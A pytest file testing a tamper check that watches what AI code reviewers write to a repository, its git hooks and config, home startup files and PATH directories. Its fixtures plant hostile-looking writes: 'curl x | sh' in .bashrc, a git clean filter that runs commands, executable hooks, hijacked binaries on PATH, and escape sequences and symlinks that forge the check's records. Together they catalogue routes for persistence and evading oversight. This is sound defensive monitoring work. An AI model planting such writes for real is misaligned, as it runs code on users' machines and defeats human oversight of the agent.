"""Tests for the tamper check: what the reviewers wrote to the tree, and what a write could hide from it or run through it."""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

import pytest
from helpers import (
    REPO_ROOT,
)


class TestTamper:
    """The loop's check that the reviewers left the tree as they found it."""

    def test_a_new_file_under_an_ignored_path_is_reported(self, tmp_path: Path) -> None:
        # Hermes writes under --yolo; a file it put in .venv or .claude, both commonly
        # ignored, was invisible to the check.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / ".gitignore").write_text(".claude/\n")
        before = tamper.snapshot(tmp_path)
        (tmp_path / ".claude").mkdir()
        (tmp_path / ".claude" / "settings.local.json").write_text("{}")
        touched = tamper.report(tmp_path, before)
        assert any(".claude" in line for line in touched)

    def test_a_new_file_in_an_existing_ignored_directory_is_reported(
        self, tmp_path: Path
    ) -> None:
        # Naming only the ignored directory, the status did not change when a file
        # was added to one that already existed.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / ".gitignore").write_text(".venv/\ndata/\n")
        (tmp_path / ".venv").mkdir()
        (tmp_path / ".venv" / "old.py").write_text("")
        round_dir = tmp_path / "data" / "reviews" / "round-1"
        round_dir.mkdir(parents=True)
        before = tamper.snapshot(tmp_path, round_dir)
        (tmp_path / ".venv" / "sitecustomize.py").write_text("")
        # The round's own outputs are not a reviewer's.
        (round_dir / "raw-1.txt").write_text("")
        touched = tamper.report(tmp_path, before, round_dir)
        assert len(touched) == 1
        assert touched[0].startswith('!! ".venv/sitecustomize.py" ')

    def test_a_second_write_to_a_changed_file_is_reported(self, tmp_path: Path) -> None:
        # Its status line was "M a.py" before and after: a reviewer's edit to a file
        # already modified, or already untracked, was not seen.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        git = ["git", "-C", str(tmp_path), "-c", "user.email=a@b", "-c", "user.name=a"]
        (tmp_path / "a.py").write_text("x = 1\n")
        subprocess.run([*git, "add", "a.py"], check=True)
        subprocess.run([*git, "commit", "-q", "-m", "base"], check=True)
        (tmp_path / "a.py").write_text("x = 2\n")  # the author's own change
        (tmp_path / "new.py").write_text("y = 1\n")  # and an untracked file
        before = tamper.snapshot(tmp_path)
        (tmp_path / "a.py").write_text("x = 3\n")
        (tmp_path / "new.py").write_text("y = 2\n")
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any(' "a.py" ' in line for line in touched)
        assert any(' "new.py" ' in line for line in touched)

    def test_a_write_to_a_git_hook_is_reported(self, tmp_path: Path) -> None:
        # Where a write becomes a command the loop's own git runs.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        before = tamper.snapshot(tmp_path)
        (tmp_path / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any("pre-commit" in line for line in touched)

    def test_a_write_to_a_hooks_path_set_elsewhere_is_reported(
        self, tmp_path: Path
    ) -> None:
        # core.hooksPath put the hooks git runs outside .git, where the check did not look.
        from scripts.review_loop import tamper

        repo = tmp_path / "repo"
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        hooks = tmp_path / "hooks"
        hooks.mkdir()
        subprocess.run(
            ["git", "-C", str(repo), "config", "core.hooksPath", str(hooks)], check=True
        )
        before = tamper.snapshot(repo)
        (hooks / "pre-commit").write_text("#!/bin/sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any("pre-commit" in line for line in touched)

    def test_a_worktree_config_change_is_reported(self, tmp_path: Path) -> None:
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        git = ["git", "-C", str(tmp_path)]
        worktree_config = "extensions.worktreeConfig"
        subprocess.run([*git, "config", worktree_config, "true"], check=True)
        before = tamper.snapshot(tmp_path)
        subprocess.run([*git, "config", "--worktree", "core.editor", "x"], check=True)
        touched = tamper.changed(before, tamper.snapshot(tmp_path))
        assert any("config.worktree" in line for line in touched)

    def test_a_write_to_a_home_startup_file_is_reported(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # hermes writes outside the repository too.
        from scripts.review_loop import tamper

        repo, home = tmp_path / "repo", tmp_path / "home"
        home.mkdir()
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        monkeypatch.setattr("scripts.review_loop.paths.homes", lambda: {home})
        before = tamper.snapshot(repo)
        (home / ".bashrc").write_text("curl x | sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(".bashrc" in line for line in touched)

    def test_a_file_planted_in_the_round_directory_is_reported(
        self, tmp_path: Path
    ) -> None:
        # Excluded whole, the round directory was a place to plant a file unseen.
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        round_dir = tmp_path / "data" / "round-1"
        round_dir.mkdir(parents=True)
        before = tamper.snapshot(tmp_path, round_dir)
        (round_dir / "raw-1.txt").write_text("")  # the round's own
        (round_dir / "evil.py").write_text("")
        (round_dir / "raw-7.txt").write_text("")  # no slot 7
        (round_dir / "stderr-2.txt").mkdir()  # a directory under an output's name
        touched = tamper.report(tmp_path, before, round_dir)
        assert any("evil.py" in line for line in touched)
        assert any("raw-7.txt" in line for line in touched)
        assert any("stderr-2.txt" in line for line in touched)
        assert not any("raw-1.txt" in line for line in touched)

    def test_a_write_through_a_link_to_a_startup_file_is_reported(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # The link looked the same; what it led to had changed.
        from scripts.review_loop import tamper

        repo, home = tmp_path / "repo", tmp_path / "home"
        home.mkdir()
        (tmp_path / "dotfiles").mkdir()
        (tmp_path / "dotfiles" / "bashrc").write_text("ok\n")
        (home / ".bashrc").symlink_to(tmp_path / "dotfiles" / "bashrc")
        subprocess.run(["git", "init", "-q", str(repo)], check=True)
        monkeypatch.setattr("scripts.review_loop.paths.homes", lambda: {home})
        before = tamper.snapshot(repo)
        (tmp_path / "dotfiles" / "bashrc").write_text("curl x | sh\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(".bashrc" in line for line in touched)

    def test_an_unchanged_tree_reports_nothing(self, tmp_path: Path) -> None:
        from scripts.review_loop import tamper

        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
        (tmp_path / "a.py").write_text("x\n")
        before = tamper.snapshot(tmp_path)
        assert tamper.changed(before, tamper.snapshot(tmp_path)) == []


class TestTamperHardening:
    """What a reviewer's write could hide from the tamper check, or run through it."""

    @staticmethod
    def _repo(path: Path) -> Path:
        subprocess.run(["git", "init", "-q", str(path)], check=True)
        (path / "a.txt").write_text("a\n")
        subprocess.run(["git", "-C", str(path), "add", "a.txt"], check=True)
        return path

    def test_an_edit_inside_an_already_dirty_embedded_repo_is_seen(
        self, tmp_path: Path
    ) -> None:
        # git lists a repository inside the tree as one entry, whatever changed in it.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        inner = repo / "vendor"
        subprocess.run(["git", "init", "-q", str(inner)], check=True)
        (inner / "x.py").write_text("one\n")
        before = tamper.snapshot(repo)
        (inner / "x.py").write_text("two, longer\n")
        touched = tamper.changed(before, tamper.snapshot(repo))
        assert any(line.startswith('?? "vendor/" ') for line in touched)

    def test_the_loops_own_log_in_the_tree_is_no_reviewers_write(
        self, tmp_path: Path
    ) -> None:
        # > data/reviews/run.log 2>&1: the log grows with each line the loop prints.
        repo = self._repo(tmp_path / "r")
        (repo / ".gitignore").write_text("data/\n")
        (repo / "data").mkdir()
        script = (
            "import sys; sys.path.insert(0, sys.argv[1])\n"
            "from pathlib import Path\n"
            "from scripts.review_loop import tamper\n"
            "repo = Path(sys.argv[2])\n"
            "before = tamper.snapshot(repo)\n"
            "print('x' * 4096, flush=True)\n"
            "(repo / 'data' / 'planted.py').write_text('')\n"
            "Path(sys.argv[3]).write_text(repr(tamper.changed(before, "
            "tamper.snapshot(repo))))\n"
        )
        result = tmp_path / "touched.txt"
        with (repo / "data" / "run.log").open("w") as log:
            subprocess.run(
                [sys.executable, "-c", script, str(REPO_ROOT), str(repo), str(result)],
                stdout=log, stderr=subprocess.STDOUT, check=True,
            )  # fmt: skip
        touched = result.read_text()
        assert "planted.py" in touched and "run.log" not in touched

    def test_a_filter_planted_in_git_config_is_not_run_by_the_check(
        self, tmp_path: Path
    ) -> None:
        # git status runs a clean filter on a file whose stat changed.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        before = tamper.snapshot(repo)
        marker = tmp_path / "ran"
        with (repo / ".git" / "config").open("a") as config:
            config.write(f'[filter "x"]\n\tclean = touch {marker}; cat\n')
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "attributes").write_text("* filter=x\n")
        (repo / "a.txt").write_text("b\n")
        touched = tamper.report(repo, before)
        assert not marker.exists()
        assert any("git status not run" in line for line in touched)

    def test_a_deleted_control_file_also_skips_git_status(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Deleting info/attributes changes what git runs as much as adding one does.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        (repo / ".git" / "info").mkdir(exist_ok=True)
        (repo / ".git" / "info" / "attributes").write_text("")
        before = tamper.snapshot(repo)
        (repo / ".git" / "info" / "attributes").unlink()

        def no_git(*_: object) -> list[str]:
            raise AssertionError("git status ran")

        monkeypatch.setattr(tamper, "_status_lines", no_git)
        touched = tamper.changed(before, tamper.snapshot(repo, None, before))
        assert any("git status not run" in line for line in touched)

    def test_a_named_log_file_is_no_reviewers_write(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # | tee data/reviews/run.log: another process writes it, so it is named.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        (repo / ".gitignore").write_text("data/\n")
        (repo / "data").mkdir()
        log = repo / "data" / "run.log"
        log.write_text("")
        monkeypatch.setattr(tamper, "LOG_FILES", {log})
        before = tamper.snapshot(repo)
        log.write_text("round 1 ...\n")
        assert tamper.changed(before, tamper.snapshot(repo)) == []

    def test_a_reviewers_file_name_cannot_rewrite_the_warning(
        self, tmp_path: Path, capsys: pytest.CaptureFixture[str]
    ) -> None:
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        before = tamper.snapshot(repo)
        (repo / "x\x1b[1A\x1b[2K\nok.py").write_text("")
        assert tamper.report(repo, before)
        listed = capsys.readouterr().out.split("Inspect before committing:\n")[1]
        assert "\x1b" not in listed and listed.count("\n") == 1

    def test_a_configured_filters_script_is_not_run_by_the_check(
        self, tmp_path: Path
    ) -> None:
        # The filter's command is set before the review; the script it runs is a tree
        # file a reviewer can rewrite, and no control file changes.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        (repo / "norm.sh").write_text("cat\n")
        (repo / ".gitattributes").write_text("*.txt filter=norm\n")
        subprocess.run(
            ["git", "-C", str(repo), "config", "filter.norm.clean", "sh norm.sh"],
            check=True,
        )
        before = tamper.snapshot(repo)
        marker = tmp_path / "ran"
        (repo / "norm.sh").write_text(f"touch {marker}; cat\n")
        (repo / "a.txt").write_text("changed\n")
        touched = tamper.report(repo, before)
        assert not marker.exists()
        assert any(line.startswith('AM "a.txt" ') for line in touched)

    def test_a_submodules_config_is_a_control_file(self, tmp_path: Path) -> None:
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        module = repo / ".git" / "modules" / "lib"
        module.mkdir(parents=True)
        (module / "config").write_text("[core]\n")
        before = tamper.snapshot(repo)
        (module / "config").write_text('[filter "x"]\n\tclean = evil\n')
        touched = tamper.changed(before, tamper.snapshot(repo, None, before))
        assert any("git status not run" in line for line in touched)

    def test_two_names_that_escape_alike_are_two(self) -> None:
        from scripts.review_loop.tamper import _shown

        assert _shown("a\nb") != _shown("a\\x0ab")
        assert "\n" not in _shown("a\nb")
        # A short escape and hex digits after it, against one longer character.
        assert _shown("x\x180e.py") != _shown("x\u180e.py")

    def test_a_link_target_cannot_forge_a_record(self, tmp_path: Path) -> None:
        # A target holding a line break and a record after it put that record in the
        # snapshot before the file it described was written.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        planted = repo / "planted.py"
        planted.write_text("x")
        forged = tamper.snapshot(repo).splitlines()
        planted.unlink()
        record = next(line for line in forged if "planted.py" in line)
        (repo / "link").symlink_to("missing\n" + record + "\nend")
        before = tamper.snapshot(repo)
        planted.write_text("x")
        assert any("planted.py" in line for line in tamper.report(repo, before))

    def test_the_rounds_inputs_may_not_be_rewritten(self, tmp_path: Path) -> None:
        # The round directory is excluded as a whole; what the reviewers were given in
        # it is what the round says they read.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        round_dir = repo / "data" / "reviews" / "round-1"
        round_dir.mkdir(parents=True)
        (round_dir / "diff.patch").write_text("+real\n")
        (round_dir / "audit.json").write_text("{}")
        before = tamper.snapshot(repo, round_dir)
        (round_dir / "diff.patch").write_text("+forged\n")
        (round_dir / "audit.json").unlink()
        touched = tamper.report(repo, before, round_dir)
        assert sum(line.startswith("round ") for line in touched) == 2

    def test_a_hook_made_executable_is_seen(self, tmp_path: Path) -> None:
        # Its bytes are the same; the next commit runs it.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        hook = repo / ".git" / "hooks" / "pre-commit"
        hook.write_text("#!/bin/sh\n")
        hook.chmod(0o644)
        before = tamper.snapshot(repo)
        hook.chmod(0o755)
        assert tamper.report(repo, before)

    def test_a_fifo_is_not_read(self, tmp_path: Path) -> None:
        # Opening one waits for a writer, and the check has no deadline.
        from scripts.review_loop import tamper

        fifo = tmp_path / "pipe"
        os.mkfifo(fifo)
        assert tamper._fingerprint(fifo, False).startswith("special:")

    def test_a_hooks_path_holding_the_checkout_is_not_the_checkout(
        self, tmp_path: Path
    ) -> None:
        # core.hooksPath=. made the whole repository a git directory: the round's own
        # outputs were a reviewer's write, and the merge agent could edit nothing.
        from scripts.review_loop import tamper
        from scripts.review_loop.merge_agent import _merge_denied
        from scripts.review_loop.paths import git_dirs as _git_dirs

        repo = self._repo(tmp_path / "r")
        subprocess.run(
            ["git", "-C", str(repo), "config", "core.hooksPath", "."], check=True
        )
        assert repo.resolve() not in _git_dirs(repo)
        assert f"Edit(/{repo.resolve()}/**)" not in _merge_denied(repo)
        assert f"Edit(/{repo.resolve()}/pre-commit)" in _merge_denied(repo)
        round_dir = repo / "data" / "reviews" / "round-1"
        round_dir.mkdir(parents=True)
        before = tamper.snapshot(repo, round_dir)
        (round_dir / "raw-1.txt").write_text("a review")
        assert tamper.report(repo, before, round_dir) == []
        (repo / "pre-commit").write_text("#!/bin/sh\n")
        assert tamper.report(repo, before, round_dir)

    def test_a_file_in_a_run_directory_of_the_home_is_seen(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Sourced by the next shell or started at the next login, with no exec bit.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        home = tmp_path / "home"
        (home / ".config" / "autostart").mkdir(parents=True)
        monkeypatch.setattr("scripts.review_loop.paths.homes", lambda: {home})
        monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
        before = tamper.snapshot(repo)
        (home / ".config" / "autostart" / "x.desktop").write_text("Exec=sh\n")
        (home / ".bashrc.d").mkdir()
        (home / ".bashrc.d" / "x.sh").write_text("echo\n")
        touched = tamper.report(repo, before)
        assert sum(line.startswith("home ") for line in touched) == 2

    def test_a_program_planted_on_a_writable_path_directory_is_seen(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # Found before the real one, it is what the loop runs next under that name.
        from scripts.review_loop import tamper

        repo = self._repo(tmp_path / "r")
        bin_dir = tmp_path / "npm-bin"
        bin_dir.mkdir()
        (bin_dir / "codex").write_text("#!/bin/sh\n")
        (bin_dir / "codex").chmod(0o755)
        monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
        before = tamper.snapshot(repo)
        (bin_dir / "git").write_text("#!/bin/sh\n")
        (bin_dir / "codex").write_text("#!/bin/sh\nevil\n")
        touched = tamper.report(repo, before)
        assert any(line.startswith("path ") and "/git" in line for line in touched)
        assert any(line.startswith("exe ") and "/codex" in line for line in touched)

    def test_no_home_at_all_is_no_crash(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import pwd

        from scripts.review_loop.paths import homes as _homes

        monkeypatch.delenv("HOME", raising=False)

        def no_entry(uid: int) -> object:
            raise KeyError(uid)

        monkeypatch.setattr(pwd, "getpwuid", no_entry)
        assert _homes() == set()
